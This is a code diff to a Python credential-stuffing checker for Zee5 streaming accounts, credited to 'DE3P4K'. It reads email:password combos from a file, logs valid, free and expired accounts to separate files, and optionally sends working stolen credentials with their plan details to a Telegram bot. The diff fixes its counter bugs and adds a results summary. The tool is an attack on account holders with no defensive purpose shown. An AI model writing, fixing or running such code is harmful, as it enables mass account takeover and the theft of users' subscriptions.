@@ -13,7 +13,8 @@ print('''
 ██╔══╝░░██╔══╝░░██╔══╝░░╚════██╗   ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
 ███████╗███████╗███████╗██████╔╝   ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
 ╚══════╝╚══════╝╚══════╝╚═════╝░   ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝''')
-print('\n                [+] Developed By DE3P4K [+]\n\n')
+print('\n                           [+] Developed By DE3P4K [+]\n')
+print('                              [+] t.me/DE3P4K07 [+]\n')
 
 while 1:
     tg = input('Send HITS to Telegram? [Y/N] : ')
@@ -48,10 +49,7 @@ print('\nStarting ...\n')
 time.sleep(2)
 combo = open('combo.txt', 'r')
 
-# good = 0
-# bad = 0
-# free = 0
-# expired = 0
+good, bad, free, expired = 0, 0, 0, 0
 
 uniq = str(datetime.datetime.now().date()) + '_' + str(datetime.datetime.now().time()).replace(':', '.')
 
@@ -69,6 +67,7 @@ while True:
     line = combo.readline()
     
     if not line:
+        print(f"\n\n[Valid]     : {good}\n[Free]      : {free}\n[Expired]   : {expired}\n[Bad]       : {bad}")
         input("\nDone. Press Enter to EXIT.")
         time.sleep(2)
         break
@@ -143,7 +142,7 @@ while True:
         exp = datetime.datetime.strptime(exp.group(), '%Y-%m-%d').date()
 
         if today<exp:
-            good =+ 1
+            good = good+1
             title = jsonresponse[0]["subscription_plan"]["original_title"]
             description = jsonresponse[0]["subscription_plan"]["description"]
             #expiry date
@@ -152,9 +151,9 @@ while True:
 
             message = f"[Zee5]\n➖➖➖➖➖➖➖➖➖➖➖➖➖\n{email} : {password}\nPlan : {title}\nDescription : {description}\nExpiry : {exp}\nAuto-Renew : {renew}\nDevice Limit : {device_limit}\n➖➖➖➖➖➖➖➖➖➖➖➖➖\nChecker by @DE3P4K07"
 
-            goodf.write("----------------------------------------------------\n")
             goodf.writelines([f"{email}:{password}\n"])
             goodf.writelines([f"Plan : {title}\n",f"Description : {description}\n", f"Expiry : {exp}\n", f"Auto-Renew : {renew}\n", f"Device Limit : {device_limit}\n"])
+            goodf.write("----------------------------------------------------\n")
 
             if tgbot == 1:
                 url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
@@ -164,14 +163,14 @@ while True:
                 print("[VALID]",email,":",password,"| Plan :",title,"| Description :",description,"| Expiry : ",exp_str)
 
         else:
-            expired =+ 1
+            expired = expired+1
             expiredf.writelines([f"{email}:{password}\n"])
 
             if show == 1:
                 print("[Expired]",email,":",password)
 
     else:
-        free =+ 1
+        free = free+1
         freef.writelines([f"{email}:{password}\n"])
         if show == 1:
             print("[Free]",email,":",password)
